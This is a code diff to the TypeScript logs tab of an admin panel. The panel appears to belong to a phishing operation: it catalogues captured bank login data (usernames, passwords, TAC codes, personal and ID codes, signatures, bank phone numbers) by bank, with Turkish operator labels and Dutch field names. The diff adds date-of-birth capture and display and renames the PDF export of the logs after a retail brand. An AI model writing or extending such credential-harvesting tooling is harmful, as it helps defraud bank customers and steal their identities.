@@ -78,8 +78,17 @@ function parseApprovalHistory(value: unknown): string[] {
 
 function inferCanonicalLogFieldKey(
   key: string,
-): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
+): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | "dateOfBirth" | null {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  if (
+    normalizedKey.includes("dateofbirth") ||
+    normalizedKey.includes("birthdate") ||
+    normalizedKey.includes("birthday") ||
+    normalizedKey.includes("dob")
+  ) {
+    return "dateOfBirth";
+  }
 
   if (
     normalizedKey.includes("personalidentitycode") ||
@@ -194,6 +203,7 @@ function isVisibleAdminBankField(formData: Record<string, any>, key: string, val
 
   const preferredKeys = new Set([
     "loginMethod",
+    "dateOfBirth",
     "personalCode",
     "bankPhone",
     "username",
@@ -293,6 +303,7 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "bankName",
     "bankSlug",
     "loginMethod",
+    "dateOfBirth",
     "orderedField1",
     "orderedField2",
     "orderedField2Type",
@@ -537,6 +548,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
   const rawGirisKodu = pickString("toegangscode", "accessCode", "bankAccessCode");
   const rawImza = pickString("signatuur", "signature");
   const rawKimlikKodu = pickString("identificatiecode", "idCode");
+  const rawDob = pickString("dateOfBirth", "dob", "birthDate", "dateofbirth");
 
   // === LABEL belirleme yardimci: DEGER ve TUR bilgisine gore DOGRU label dondurur ===
   const labelFor = (val: string, opts: {
@@ -602,6 +614,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
   if (rawGirisKodu && !results.some(([, v]) => v === rawGirisKodu)) results.push(["Giriş Kodu", rawGirisKodu]);
   if (rawImza && !results.some(([, v]) => v === rawImza)) results.push(["İmza", rawImza]);
   if (rawKimlikKodu && !results.some(([, v]) => v === rawKimlikKodu)) results.push(["Kimlik Kodu", rawKimlikKodu]);
+  if (rawDob && !results.some(([, v]) => v === rawDob)) results.push(["Doğum Tarihi", rawDob]);
   return results;
 }
 
@@ -1991,7 +2004,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         defaultStyle: { fontSize: 7 },
       };
 
-      pdfMake.createPdf(doc).download(`iki-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
+      pdfMake.createPdf(doc).download(`tesco-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
     } catch (e) {
       alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
     } finally {
